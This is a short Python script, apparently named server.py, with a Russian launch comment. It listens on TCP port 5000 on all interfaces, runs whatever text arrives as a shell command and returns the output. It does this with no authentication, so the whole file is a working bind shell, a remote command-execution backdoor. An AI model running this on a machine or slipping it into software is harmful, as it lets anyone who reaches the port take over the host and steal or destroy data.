# запуск
# python3 server.py 

import socket
import subprocess

s = socket.socket()
s.bind(("", 5000))
s.listen()
while True:
    c, _ = s.accept()
    cmd = c.recv(1024).decode()
    res = subprocess.run(
        cmd,
        shell=True,
        capture_output=True,
        text=True
    )
    c.send((res.stdout + res.stderr).encode())
    c.close()